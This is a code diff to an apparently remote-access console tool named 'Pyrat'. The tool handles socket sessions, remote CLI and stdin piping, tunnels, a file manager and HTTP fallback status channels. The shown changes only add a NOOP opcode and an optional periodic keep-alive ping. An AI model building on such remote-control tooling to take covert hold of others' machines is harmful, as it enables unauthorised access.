@@ -18,7 +18,7 @@ import signal
 from collections import deque
 from utils.utils import get_file_list
 from utils.config import load_config, get_heart_beat_channel
-from utils.heartbeat import HeartBeatThread
+from utils.Heartbeat import HeartBeatThread
 import queue
 import socket
 from datetime import datetime
@@ -27,6 +27,7 @@ from web.CmdRelay import set_channel
 import datetime
 
 OPT_QUIT = 0xFF
+OPT_NOOP = 0x00
 OPT_PING = 0x01
 OPT_CLI = 0x02
 OPT_PIPE_STDIN = 0x03
@@ -50,6 +51,7 @@ OPT_FOLDER_INFO = 0x14
 
 OPT_KEEP_ALIVE_REQ = 0x20
 OPT_KEEP_ALIVE_REP = 0x21
+
 
 _controlc_count = 0
 
@@ -75,6 +77,8 @@ class SocketThread(threading.Thread):
         super().__init__()
         self.socket = socket
         self.queue = queue.Queue()
+        self.auto_ping = False
+        self.last_ping = 0
 
     def run(self):
         global _run, _connection_monitor_threads, _socket_threads, _tunnels, _file_manager, _selected_socket
@@ -84,6 +88,10 @@ class SocketThread(threading.Thread):
             self.socket.settimeout(5)
 
             try:
+                if self.auto_ping and self.last_ping < time.time() - 60:
+                    self.noOp()
+                    self.last_ping = time.time()
+
                 packet = self.socket.receive()
             except socket.timeout:
                 if _tunnel_mode == 'remote' and self.socket.get_last_received_time() < time.time() - 300:
@@ -103,7 +111,9 @@ class SocketThread(threading.Thread):
                 break
 
             try: # Make sure exceptions do not terminate the thread
-                if packet[0] == OPT_KEEP_ALIVE_REQ:
+                if packet[0] == OPT_NOOP: # NOOP is just a ping without a reply, it allows a manually enabled keep alive
+                    continue
+                elif packet[0] == OPT_KEEP_ALIVE_REQ:
                     print("OPT_KEEP_ALIVE_REQ", datetime.datetime.now())
                     self.socket.send(OPT_KEEP_ALIVE_REP.to_bytes(1, 'big'))
                 elif packet[0] == OPT_KEEP_ALIVE_REP:
@@ -373,6 +383,12 @@ class SocketThread(threading.Thread):
 
     def keepAlive(self):
         self.socket.send(OPT_KEEP_ALIVE_REQ.to_bytes(1, 'big'))
+
+    def autoPing(self, val):
+        self.auto_ping = val
+
+    def noOp(self):
+        self.socket.send(OPT_NOOP.to_bytes(1, 'big'))
         
     def ping(self, data):
         print("Pinging : "+ data)
@@ -823,6 +839,9 @@ class ConsoleThread(threading.Thread):
                     _selected_socket = _socket_threads[index]
 
                 elif parts[0] == "ping":
+                    if (len(parts) >= 2):
+                        _selected_socket.autoPing(True)
+
                     data = parts[1]
                     ret = _selected_socket.ping(data)
                     print(ret)
@@ -1142,9 +1161,6 @@ def main():
         wcp.set_callback(webCommandParserCallback)
         _http_fallbacks.append(wcp)
         
-        current_datetime = datetime.datetime.now()
-        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
-        
     if _tunnel_mode == 'local':
         while len(_socket_threads) == 0:
             time.sleep(1)
@@ -1162,6 +1178,8 @@ def main():
             _heart_beat_thread.start()
 
         for http_fallback in _http_fallbacks:
+            current_datetime = datetime.datetime.now()
+            formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
             while not set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), enc_keys, -1, "Pyrat launched: " + formatted_datetime):
                 time.sleep(5)
 
